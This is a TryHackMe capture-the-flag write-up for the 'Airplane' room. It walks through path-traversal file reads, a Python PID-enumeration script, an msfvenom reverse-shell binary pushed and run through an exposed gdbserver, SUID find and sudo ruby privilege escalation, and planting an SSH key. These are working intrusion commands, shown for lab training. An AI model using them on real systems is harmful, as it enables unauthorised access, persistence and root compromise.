# Airplane

---

Platform: Tryhackme

Difficulty: Medium

Date: 30/06/2025

Status: Rooted

---

Nmap results:

```bash
nmap -Pn -O -sC -A -p- --min-rate=3000 -oN nmap.full 10.10.65.147
```

```bash
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b8:64:f7:a9:df:29:3a:b5:8a:58:ff:84:7c:1f:1a:b7 (RSA)
|   256 ad:61:3e:c7:10:32:aa:f1:f2:28:e2:de:cf:84:de:f0 (ECDSA)
|_  256 a9:d8:49:aa:ee:de:c4:48:32:e4:f1:9e:2a:8a:67:f0 (ED25519)
6048/tcp open  x11?
8000/tcp open  http    Werkzeug httpd 3.0.2 (Python 3.8.10)
|_http-title: Did not follow redirect to http://airplane.thm:8000/?page=index.html
|_http-server-header: Werkzeug/3.0.2 Python/3.8.10
Device type: general purpose
Running: Linux 4.X
```

- Port 22 - open ssh (Newer version, no need to check for exploit.)
- Port 6048 - x11? (Unknown service running, we will check that later.)
- Port 8000 - http Werkzeug httpd 3.0.2 (Python 3.8.10) followed redirect to http://airplane.thm:8000/?page=index.html, we have to add airplane.thm to our /etc/hosts file, so that we can connect to it and enumerate it further.

---

Port 8000:

![image.png](image.png)

Nothing intresting here, not even in source code. Tried directory busting and found only single directory named /airplane. Nothing juicy was there too. 

Now coming back to it’s original website, it’s url lools wierd:

```bash
[http://airplane.thm:8000/?page=index.html](http://airplane.thm:8000/?page=index.html)
```

Looks like we can go for path traversal check in it, and that’s it it is vulnerable to path traversal, attacker can get /etc/passwd file via path traversal, that means there was more juicy information stored too. Let’s enumerate it more….

```bash
[http://airplane.thm:8000/?page=](http://airplane.thm:8000/?page=index.html)../../../../../etc/passwd

┌──(kali㉿kali)-[~/tryhackme/airplane]
└─$ cat passwd   
root:x:0:0:root:/root:/bin/bash
....
carlos:x:1000:1000:carlos,,,:/home/carlos:/bin/bash
hudson:x:1001:1001::/home/hudson:/bin/bash
```

In that passwd file, there were 2 users carlos and hudson, so i tried to get id_rsa of both user one by one through that path traversal, but that didn’t work. So that means we have to do a little bit of extra enumeration and use our brain more to figure out how we can use that path traversal vulnerability to gain initial access.

Checked the environment variable of the current process:

```bash
http://airplane.thm:8000/?page=./../../../../proc/self/environ

┌──(kali㉿kali)-[~/Downloads]
└─$ cat environ   
LANG=en_US.UTF-8LC_ADDRESS=tr_TR.UTF-8LC_IDENTIFICATION=tr_TR.UTF-8LC_MEASUREMENT=tr_TR.UTF-8LC_MONETARY=tr_TR.UTF-8LC_NAME=tr_TR.UTF-8LC_NUMERIC=tr_TR.UTF-8LC_PAPER=tr_TR.UTF-8LC_TELEPHONE=tr_TR.UTF-8LC_TIME=tr_TR.UTF-8PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/binHOME=/home/hudsonLOGNAME=hudsonUSER=hudsonSHELL=/bin/bashINVOCATION_ID=95f7ec7e80504909a22062b382e9cb49JOURNAL_STREAM=9:19398
```

So, the process is run on the context of user hudson.Let’s check /proc/self/cmdline .(proc/self/cmdline can be **used to get an idea of how the program was invoked** and potentially see source code location.)

```bash
http://airplane.thm:8000/?page=./../../../../proc/self/cmdline

┌──(kali㉿kali)-[~/Downloads]
└─$ cat cmdline
/usr/bin/python3app.py
```

An [app.py](http://app.py) was running there via user hudson, we can check that app.py too.

![Screenshot_2025-06-30_191022.png](Screenshot_2025-06-30_191022.png)

There was nothing interesting, it was the same page which was hosting index.php and vulnerable to LFI. Nothing more to take from here.

Now, we can try `/proc/[pid]/cmdline` to investigate, what might be running at port 6048.

`/proc/[pid]/cmdline` is a file in the Linux proc file system that contains the command-line arguments used to start the process with the specified process ID (PID). This can either be achieved by FuFF or a custom script fetching each possible ID. If the port is used as a parameter, we might be able to identify what is running on 6048.

Made a python script to fetch the first 1000 pids:

```bash
┌──(kali㉿kali)-[~/tryhackme/airplane]
└─$ cat pid-enum.py 
#!/usr/bin/python3

import requests

for i in range(1,1001):
        print(f"\r{i}", end="", flush=True)
        url = f"http://airplane.thm:8000/?page=../../../../../../proc/{i}/cmdline"
        response = requests.get(url)

        if response.status_code == 200:
                content = response.text
                if "Page not found" not in content and content:
                        print(f"\r/proc/{i}/cmdline: {content}")
```

```bash
┌──(kali㉿kali)-[~/tryhackme/airplane]
└─$ python3 pid-enum.py      
/proc/1/cmdline: /sbin/initsplash
/proc/223/cmdline: /lib/systemd/systemd-journald
....
/proc/531/cmdline: /usr/bin/gdbserver0.0.0.0:6048airplane
```

So, at port 6048 gdbserver was running, now we can gain initial foothold wiht the information we have, we can find ways how to use gdbserver to our advantage to gain reverse shell. HackTricks has a great resource on that topic and provide step by step commands to upload and execute a reverse shell using a gdb server:

[Pentesting Remote GdbServer | hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-remote-gdbserver#upload-and-execute)

So, by following hacktricks article, we can create a shell binary using msfvenom and give it executable permission.

```bash
┌──(kali㉿kali)-[~/tryhackme/airplane]
└─$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=4444 PrependFork=true -f elf -o binary.elf
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 106 bytes
Final size of elf file: 226 bytes
Saved as: binary.elf                                                                                                                           
┌──(kali㉿kali)-[~/tryhackme/airplane]
└─$ chmod +x binary.elf
```

Next, setup a listner on port 4444:

```bash
┌──(kali㉿kali)-[~/tryhackme/airplane]
└─$ rlwrap -f . -r nc -nvlp 4444
listening on [any] 4444 ...
```

We run gbd on our local binary and start a remote debugging connection via `target extended-remote 10.10.242.124:6048`. Then we copy our binary to `/home/hudson/binary.elf` via `remote put binary.elf /home/hudson/binary.elf` and execute it `set remote exec-file /home/hudson/binary.elf` `run.`

```bash
┌──(kali㉿kali)-[~/tryhackme/airplane]
└─$ gdb binary.elf                                                                                             
GNU gdb (Debian 16.3-1) 16.3
Copyright (C) 2024 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
....
(gdb) target extended-remote 10.10.39.13:6048
Remote debugging using 10.10.39.13:6048
Reading /lib64/ld-linux-x86-64.so.2 from remote target...
....
(gdb)  remote put binary.elf /home/hudson/binary.elf
Successfully sent file "binary.elf".
(gdb) set remote exec-file /home/hudson/binary.elf
(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program:  
Reading /home/hudson/binary.elf from remote target...
....
```

We got a connection back as user hudson and upgraded our reverse shell via python.

```bash
┌──(kali㉿kali)-[~/tryhackme/airplane]
└─$ rlwrap -f . -r nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.17.87.131] from (UNKNOWN) [10.10.39.13] 37050
id
uid=1001(hudson) gid=1001(hudson) groups=1001(hudson)
python3 -c 'import pty;pty.spawn("/bin/bash")'
hudson@airplane:/opt$ cd /home/hudson
cd /home/hudson
```

Now, we have to escalate our privilege to user carlos, because user.txt was not in hudson user’s home directory.

Tried finding suid binaries:

```bash
hudson@airplane:/home/hudson$ find / -perm -4000 -type f 2>/dev/null
find / -perm -4000 -type f 2>/dev/null
/usr/bin/find
/usr/bin/sudo
/usr/bin/pkexec
```

Escalated our privileges via that find suid binary:

[Find SUID | Gtfobins](https://gtfobins.github.io/gtfobins/find/#suid)

```bash
hudson@airplane:/home/hudson$ /usr/bin/find . -exec /bin/sh -p \; -quit
/usr/bin/find . -exec /bin/sh -p \; -quit
$ id
id
uid=1001(hudson) gid=1001(hudson) euid=1000(carlos) groups=1001(hudson)
$ whoami
whoami
carlos
$ cat user.txt
cat user.txt
eebfca2ca5a2b....REDACTED
```

We can now add a public RSA key to the `/home/carlos/.ssh/authorized_keys` file to establish a more stable shell using ssh. We create a new key pair using `ssh-keygen` .

```bash
┌──(kali㉿kali)-[~/tryhackme/airplane]
└─$ ssh-keygen -t rsa
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kali/.ssh/id_rsa): ./carlos           
Enter passphrase for "./carlos" (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in ./carlos
Your public key has been saved in ./carlos.pub
The key fingerprint is:
SHA256:B5IH0fvj4WLPbtCAgtcwbdi7sjTEr/MG1RgehktR51o kali@kali
The key's randomart image is:
+---[RSA 3072]----+
|    .B+o.        |
|    * B=.        |
|   + OoBE.       |
|  . * B=+.       |
|   o +..S+.      |
|    = o ..=      |
|   . *   + o     |
|    + . o.+      |
|     +.. =+      |
+----[SHA256]-----+
```

Now, we can copy paste that public key into carlos’s authorized_keys

```bash
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC15v5YIjnJwpnXfykzlg8oeAM0ba9tg8BeU8FZjFIO+CDAurkEbiAY1fOvJvmwtR5lAl3FVZZd1VUhZv/QQooWtyqn2F4kolKODrlEAeIDzS0mz6rtMl5BoICeQO57kIDeSUKgW9zGxolOh5Sdo64K3DaJpSrQ4Iau7ftsU0F8pyY7G8vTZmxRFk4OpPLRDmog7FqYASrHzVAKyQy42D29GRgVdruSkcnqc6irkMgGS9mzkOdioI9y3EaOd8HTO+dvg2gEQw1zp2e/y37AyZd1O9hapXMopBRveKeRj3KSfYtnuu2xJ0yRydn6ztqkRFRkDP+A3YatboHnsWJ3u3BQFRSyTJdj8eIrGMaCm9KL6NxOoBKpXLkiqdFHsPUyTPx4O4gHFh18/LhZ1VVnFylTRvC/KZxQyqMdJs0Gv5omH5NqTdXYIc2VG9Y2MbxGcAmfEsRcuHu+mkjP0WEPM9Ti0FlBT82siD7qOZB6B6iKnIFhl6tUtan4No9kJxck7P0= kali@kali" > /home/carlos/.ssh/authorized_keys
```

Now, we were able to ssh to user carlos with that private key.

```bash
┌──(kali㉿kali)-[~/tryhackme/airplane]
└─$ ssh -i carlos carlos@10.10.39.13
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-139-generic x86_64)
```

Now, look for sudo permissions as user carlos:

```bash
carlos@airplane:~$ sudo -l
Matching Defaults entries for carlos on airplane:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User carlos may run the following commands on airplane:
    (ALL) NOPASSWD: /usr/bin/ruby /root/*.rb
```

Interesting, user carlos can run `/usr/bin/ruby` with a wildcard file with extension `.rb` . We can use that in our favour and can privesc to root.

Made a file evil.rb which will execute `/bin/bash` when [executed.](http://executed.Now) And executed that file with our sudo privileges and got root shell back. That’s it ! 

```bash
carlos@airplane:~$ echo 'system("/bin/bash")' > evil.rb
carlos@airplane:~$ ls
Desktop  Documents  Downloads  evil.rb  Music  Pictures  Public  Templates  user.txt  Videos
carlos@airplane:~$ sudo /usr/bin/ruby /root/../home/carlos/evil.rb
root@airplane:/home/carlos# cd /root
root@airplane:~# ls
root.txt  snap
root@airplane:~# cat root.txt
190dcbeb688.....REDACTED
```